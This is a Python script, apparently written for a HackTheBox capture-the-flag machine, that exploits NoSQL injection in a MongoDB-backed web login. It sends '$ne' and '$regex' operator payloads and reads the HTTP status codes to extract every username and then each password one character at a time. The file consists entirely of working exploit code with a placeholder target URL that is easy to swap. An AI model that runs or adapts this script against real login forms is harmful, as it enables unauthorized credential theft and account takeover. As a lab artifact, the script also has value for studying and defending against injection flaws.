import requests

url = 'http://staging-order.mango.htb/'  # !!change url!!
username = None


def is_complete(secret):
    if username_enumeration:
        return is_injectable({"username": secret, "password[$ne]": "", "login": "login"})
    else:
        return is_injectable({"username": username, "password": secret, "login": "login"})


def get_querry(payload):
    if username_enumeration:
        return {"username[$regex]": "^" + payload, "password[$ne]": "", "login": "login"}
    else:
        return {"username": username, "password[$regex]": "^" + payload, "login": "login"}


def is_injectable(data):
    r = requests.post(url, data=data, allow_redirects=False)  # proxies={'http':'localhost:8080'}
    if r.status_code != 200:
        return True


def find_next_letters(secret):
    valid_letters = []
    for i in range(32, 127):  # ASCII decimal - alphanum + special symbols
        if chr(i) in "*.?^$|+":  # regex special symbols
            continue
        else:
            next_letter = chr(i)

        if not valid_letters and not username_enumeration:
            print("\r{}:{}".format(username, secret + next_letter), flush=False, end='')
        elif not valid_letters:
            print("\r" + secret + next_letter, flush=False, end='')

        if is_injectable(get_querry(secret + next_letter)):
            valid_letters.append(next_letter)
            if not username_enumeration:  # for password is relevant just first letter occurrence
                break

    return valid_letters


def find_password(target_username):
    global username
    global username_enumeration
    username = target_username
    username_enumeration = False
    find_secret([])
    username_enumeration = True


def find_secret(found, secret=""):
    if is_complete(secret):
        found.append(secret)
        #find_password(secret)
        print()
    else:
        for next_letter in find_next_letters(secret):
            find_secret(found, secret + next_letter)
    return found


username_enumeration = True
# enumerate usernames
usernames = find_secret([])

# enumerate passwords
username_enumeration = False
for username in usernames:
    find_secret([])

# credentials = dict.fromkeys(usernames, "")
# for username in credentials:
#    credentials[username] = find_secret("")[-1]

# report
# for username in credentials:
#   print(("{}:{}").format(username, credentials[username]))
